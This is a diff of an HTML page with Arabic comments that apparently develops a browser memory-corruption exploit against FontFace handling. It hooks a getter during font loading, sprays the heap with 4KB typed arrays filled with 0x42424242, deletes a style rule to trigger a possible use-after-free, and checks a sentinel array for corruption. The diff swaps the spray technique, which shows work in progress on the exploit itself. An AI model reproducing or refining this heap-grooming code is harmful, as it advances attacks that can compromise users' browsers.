@@ -6,13 +6,12 @@
     </style>
 </head>
 <body>
-    <div id="debug" style="color:blue; font-family:monospace;">Status: Initializing Monitor...</div>
+    <div id="debug" style="color:red; font-family:monospace;">Status: Ready...</div>
     <script>
         const debug = document.getElementById('debug');
         const MAGIC = 0x41414141;
-        // الـ Sentinel: مصفوفة نراقبها بحثاً عن أي تغيير غير منطقي
-        let sentinel = new Uint32Array(1024);
-        sentinel.fill(MAGIC);
+        // المصفوفة التي نراقبها
+        let sentinel = new Uint32Array(1024).fill(MAGIC);
 
         window.onload = () => {
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
@@ -25,17 +24,20 @@
                 get() {
                     if (!fired && this === A) {
                         fired = true;
-                        debug.innerText = "Status: Hooked. Spraying 200 objects...";
+                        debug.innerText = "Status: Hooked. Spraying Memory...";
                         
-                        // زيادة الضغط تدريجياً لضمان التصادم
-                        for(let i=0; i<300; i++) { 
-                            new FontFace('y'+i, 'local(Helvetica)');
+                        // التغيير هنا: استخدام Uint32Array بدلاً من FontFace
+                        // هذا يحجز مساحة في الذاكرة بدون ثقل الـ CSS
+                        let spray = [];
+                        for(let i=0; i<100; i++) { 
+                            // كل مصفوفة حجمها 0x1000 (4KB)
+                            spray.push(new Uint32Array(0x1000).fill(0x42424242));
                         }
                         
                         document.getElementById('s').sheet.deleteRule(0);
                         document.body.offsetTop;
                         
-                        // التحقق: هل الـ Sentinel تأثر؟
+                        // التحقق
                         let corrupted = false;
                         for(let i=0; i<sentinel.length; i++) {
                             if(sentinel[i] !== MAGIC) {
@@ -46,16 +48,14 @@
                         }
                         
                         if(!corrupted) {
-                            debug.innerText = "Status: Grooming complete. No corruption detected (Need more Spray).";
+                            debug.innerText = "Status: Grooming complete. No corruption.";
                         }
                     }
                     return undefined;
                 }
             });
 
-            document.fonts.load('1em x', 'AB').catch((e) => {
-                // Ignore
-            });
+            document.fonts.load('1em x', 'AB');
         };
     </script>
 </body>
